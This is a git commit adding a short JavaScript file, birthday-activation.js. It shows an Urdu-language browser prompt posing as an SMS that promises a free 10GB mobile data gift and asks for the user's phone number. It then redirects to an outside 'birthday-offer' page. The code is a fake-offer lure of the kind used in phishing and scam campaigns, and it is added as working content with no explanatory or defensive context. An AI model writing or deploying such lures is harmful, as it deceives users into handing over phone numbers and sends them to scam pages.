15dd730ccc3521354ababc4317e6bfe16aeb67bf
sweet16palz-hub <sweet16palz@gmail.com>
2026-01-20 16:52:47 +0100

    Create birthday-activation.js

---
+++ birthday-activation.js
@@ -0,0 +1,5 @@
+var password = '10 جی بی کو چالو کریں۔'
+password=prompt('SMS: مبارک ہو، آپ کا موبائل نمبر 10GB وصول کرنے کا اہل ہے، اپنا موبائل نمبر درج کرنے کے لیے OK پر کلک کریں۔','10 جی بی کو چالو کریں۔');
+if (password != '10 جی بی کو چالو کریں۔') {
+location.href='https://gbamz.com/birthday-offer.html';
+}
